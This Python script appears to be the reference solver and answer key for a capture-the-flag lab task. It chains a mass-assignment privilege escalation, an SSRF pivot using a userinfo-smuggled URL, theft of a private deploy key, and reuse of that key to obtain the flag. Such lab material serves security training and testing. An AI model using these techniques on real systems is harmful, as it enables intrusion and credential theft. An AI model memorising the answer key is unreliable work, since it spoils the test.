#!/usr/bin/env python3
"""
Reference solution for the edge-pivot task.

Chains the five intended stages and prints the flag; optionally writes a
machine-readable transcript for the grader.

  1. Recon        GET  /api/spec        -> internal upstream + operator gate
  2. Priv-esc     POST /api/session     -> mass-assign role=operator
  3. SSRF pivot   POST /api/reports/render with a userinfo-smuggled URL
                  -> server-side fetch reaches the internal collector
  4. Exfiltrate   same SSRF, /metrics?q=... -> search leaks the private deploy key
  5. Reuse+flag   present the key to /api/reports/publish -> flag

Usage:
    python solver.py --base URL [--transcript PATH] [--quiet]
"""
import argparse
import json
import pathlib
import re
import sys
import time

import requests

# Prefer the shared harness Recorder (the transcript contract); fall back to an
# inline copy so the solver also runs standalone inside a minimal container.
try:
    sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[2]))  # repo root
    from harness.transcript import Recorder  # noqa: E402
except Exception:  # noqa: BLE001
    class Recorder:
        def __init__(self):
            self.turns = []

        def log(self, action, method, url, request_body, response):
            try:
                body = response.json()
                body_text = json.dumps(body)
            except ValueError:
                body, body_text = None, response.text
            self.turns.append({
                "turn": len(self.turns) + 1, "action": action,
                "request": {"method": method, "url": url, "body": request_body},
                "response": {"status": response.status_code, "json": body,
                             "text": body_text[:4000]},
            })
            return body if body is not None else response.text

        def as_transcript(self, flag=None, elapsed_s=None):
            out = {"turns": self.turns}
            if flag is not None:
                out["flag"] = flag
            if elapsed_s is not None:
                out["elapsed_s"] = elapsed_s
            return out

FLAG_RE = re.compile(r"flag\{[a-z0-9_]{8,}\}")
SSRF_PREFIX = "http://telemetry.internal.example@collector:9000"


def solve(base, recorder, verbose=True):
    def say(m):
        if verbose:
            print(m)

    r = requests.get(f"{base}/api/spec", timeout=5)
    spec = recorder.log("recon:spec", "GET", f"{base}/api/spec", None, r)
    say(f"[1] recon: internal upstream = "
        f"{spec.get('upstreams', {}).get('telemetry_store')}")

    payload = {"user": "solver", "role": "operator"}
    r = requests.post(f"{base}/api/session", json=payload, timeout=5)
    body = recorder.log("privesc:session", "POST", f"{base}/api/session", payload, r)
    headers = {"Authorization": f"Bearer {body['token']}"}
    r = requests.get(f"{base}/api/whoami", headers=headers, timeout=5)
    who = recorder.log("privesc:whoami", "GET", f"{base}/api/whoami", None, r)
    say(f"[2] privesc: token role = {who['claims']['role']}")

    pivot = {"source": f"{SSRF_PREFIX}/"}
    r = requests.post(f"{base}/api/reports/render", json=pivot, headers=headers, timeout=8)
    rendered = recorder.log("ssrf:pivot", "POST", f"{base}/api/reports/render", pivot, r)
    say(f"[3] ssrf: reached collector banner -> "
        f"{json.loads(rendered['rendered']).get('service')}")

    exfil = {"source": f"{SSRF_PREFIX}/metrics?q=deploy"}
    r = requests.post(f"{base}/api/reports/render", json=exfil, headers=headers, timeout=8)
    ex = recorder.log("exfil:search", "POST", f"{base}/api/reports/render", exfil, r)
    private = next(m for m in json.loads(ex["rendered"])["metrics"]
                   if m.get("visibility") == "private")
    deploy_key = private["value"]
    say(f"[4] exfil: recovered private deploy key = {deploy_key}")

    pub_headers = dict(headers, **{"X-Deploy-Key": deploy_key})
    r = requests.post(f"{base}/api/reports/publish", headers=pub_headers, json={}, timeout=5)
    published = recorder.log("publish:deploy-key", "POST",
                             f"{base}/api/reports/publish",
                             {"X-Deploy-Key": deploy_key}, r)
    match = FLAG_RE.search(json.dumps(published))
    if not match:
        raise RuntimeError("flag not returned by publish endpoint")
    say(f"[5] flag: {match.group(0)}")
    return match.group(0)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://127.0.0.1:8080")
    ap.add_argument("--transcript", default=None)
    ap.add_argument("--quiet", action="store_true")
    args = ap.parse_args()

    rec = Recorder()
    t0 = time.time()
    try:
        flag = solve(args.base, rec, verbose=not args.quiet)
    except Exception as exc:  # noqa: BLE001
        if args.transcript:
            pathlib.Path(args.transcript).write_text(
                json.dumps(rec.as_transcript(flag=None), indent=2), encoding="utf-8")
        print(f"SOLVE FAILED: {exc}", file=sys.stderr)
        return 1

    elapsed = time.time() - t0
    if args.transcript:
        pathlib.Path(args.transcript).write_text(
            json.dumps(rec.as_transcript(flag=flag, elapsed_s=elapsed), indent=2),
            encoding="utf-8")
    if not args.quiet:
        print(f"\nSolved in {len(rec.turns)} turns / {elapsed:.2f}s")
    print(flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())
